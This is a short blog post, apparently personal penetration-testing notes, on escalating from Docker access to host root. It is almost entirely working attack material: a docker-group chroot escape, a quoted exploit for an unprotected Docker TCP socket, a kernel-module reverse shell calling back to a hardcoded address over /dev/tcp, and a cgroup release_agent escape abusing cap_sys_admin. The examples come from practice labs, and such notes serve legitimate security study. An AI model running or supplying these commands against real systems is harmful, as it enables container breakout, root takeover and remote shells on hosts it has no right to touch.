---
layout: single
title: Docker to Root
excerpt: A short document to show how to escalae privileges from Docker to root.
date: 2022-02-11
classes: wide
header:
  teaser: #/assets/images/htb-writeup-giddy/giddy_logo.png
categories:
  - privesc
tags:
  - docker
---

# Command
```bash
docker run -it -v /:/mnt alpine chroot /mnt
```
	

## Example:

```bash
anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)

anurodh@ubuntu:~$ docker run -it -v /:/mnt alpine chroot /mnt
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@15789112ea96:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@15789112ea96:/#
```

	
	
## Docker Daemon - Unprotected TCP Socket

```bash
# Exploit Title: Docker Daemon - Unprotected TCP Socket
# Date: 20-07-2017
# Exploit Author: Martin Pizala
# Vendor Homepage: <https://www.docker.com>
# Software Link: <https://www.docker.com/get-docker>
# Version: Since 0.4.7 (2013-06-28) (feature: mount host directories)
# Tested on: Docker CE 17.06.0-ce and Docker Engine 1.13.1
 
1. Description

Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp with tls but without tls-auth), an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container and use chroot to escape the container-jail.

2. Proof of Concept

docker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
```

## Example

```bash
# docker -H escape.thm:2375 run -v /:/mnt --rm -it nginx chroot /mnt sh

-H for remote host <host>:<port> (escape.thm:2375)
-v Mounting volume /:/mnt ( Mount / of host to /mnt of the container )
--rm remove the container after user exits the container
-it for interactive mode
chroot /mnt to change root directory to /mnt
sh to run shell
```


# Abusing `cap_sys_module`

## Install the following requirements
```bash
apt update && apt install -y gcc make linux-headers
```

## Create the kernel module - reverse shell
```bash
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.2/1337 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

## Create the Makefile
```bash
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
clean:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
```

## Make and install the kenel module
```bash
make && insmod reverse-shell.ko
```



# Abusing `cap_sys_admin`

## Check the capabilities
```bash
capsh --print
```

## PoC
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```


# Sources
https://blog.nody.cc/posts/container-breakouts-part2/

https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host